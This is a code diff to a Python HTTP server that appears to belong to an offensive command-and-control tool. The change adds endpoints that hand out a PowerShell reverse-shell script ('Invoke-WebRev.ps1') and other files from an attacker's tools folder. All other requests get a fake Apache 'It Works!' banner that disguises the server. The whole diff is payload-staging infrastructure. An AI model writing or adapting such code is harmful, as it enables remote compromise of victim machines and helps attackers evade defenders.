@@ -3,7 +3,7 @@ import threading
 import globals, certificate, modulescontroller
 from Color import Color
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import readline, base64, urllib.parse, time, ssl, argparse, json, ipaddress, datetime
+import readline, base64, urllib.parse, time, ssl, argparse, json, ipaddress, datetime, ntpath
 from os import listdir, sep, path
 
 allowed_net = ipaddress.ip_network('78.157.129.0/24')
@@ -23,10 +23,27 @@ class myHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         client = ipaddress.ip_address(self.client_address[0])
         if (client in priv_net) or (bypass == True):
-            self.server_version = "Apache/2.4.18"
-            self.sys_version = "(Ubuntu)"
-            self.send_response(200)
-            self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
+            if self.path.startswith('/g/'):
+            # Compile path
+                filepath = '/home/jedi/Desktop/tools/inter-resources/https/tools/Invoke-WebRev.ps1'
+                with open(filepath, 'rb') as f:
+                    self.send_response(200)
+                    self.send_header('content-type', 'application/octet-stream')
+                    self.end_headers()
+                    self.wfile.write(f.read())
+            elif self.path.startswith('/f/'):
+                filename = ntpath.basename(self.path)
+                filepath = '/home/jedi/Desktop/tools/inter-resources/https/tools/%s' % filename
+                with open(filepath, 'rb') as f:
+                    self.send_response(200)
+                    self.send_header('content-type', 'application/octet-stream')
+                    self.end_headers()
+                    self.wfile.write(f.read())
+            else:
+                self.server_version = "Apache/2.4.18"
+                self.sys_version = "(Ubuntu)"
+                self.send_response(200)
+                self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
         else:
             self.send_response(404)
             self.send_header("Content-type", "text/html")
